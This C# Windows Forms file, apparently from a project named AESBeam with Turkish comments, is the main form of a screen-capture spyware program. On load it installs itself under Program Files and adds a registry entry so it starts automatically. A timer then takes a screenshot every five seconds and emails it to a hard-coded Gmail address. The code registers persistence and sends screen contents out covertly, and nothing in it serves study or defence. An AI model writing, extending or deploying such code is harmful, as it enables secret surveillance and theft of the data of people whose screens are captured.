using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace AESBeam
{
    public partial class Master : Form
    {
        public Master()
        {
            InitializeComponent();
        }

        private void Master_Load(object sender, EventArgs e)
        {   
            //Klasör ve dosyanın Program Files dizininde oluşturulması
            string AppDirectory = AutoStart.GetPFDirectory("AES\\AESBeam.exe");
            string DataDirectory = AutoStart.GetPFDirectory("AES\\Data");
            AutoStart.AddDirectory(AppDirectory, DataDirectory);
            //Başlangıçta otomatik başlatmak için kayıt defterine kaydedilmesi
            AutoStart.AddtoReg("AESBeam", AppDirectory);
            timer.Enabled = true;
            timer.Interval = 5000;
        }

        private void timer_Tick(object sender, EventArgs e)
        {
            //Zamanlayıcı ile belli bir sürenin içerisinde işlem yapılacak
            //Ekran görüntüsünün uygulama dizinine kaydedilmesi
            string DataDirectory = AutoStart.GetPFDirectory("AES\\Data");
            string SSFileName = ScreenShot.SSFileName();
            ScreenShot.CreateSS(DataDirectory, SSFileName);
            SMTPMailer.SendMail(DataDirectory + "\\" + SSFileName, "aerdemsunar@gmail.com");
        }
    }
}
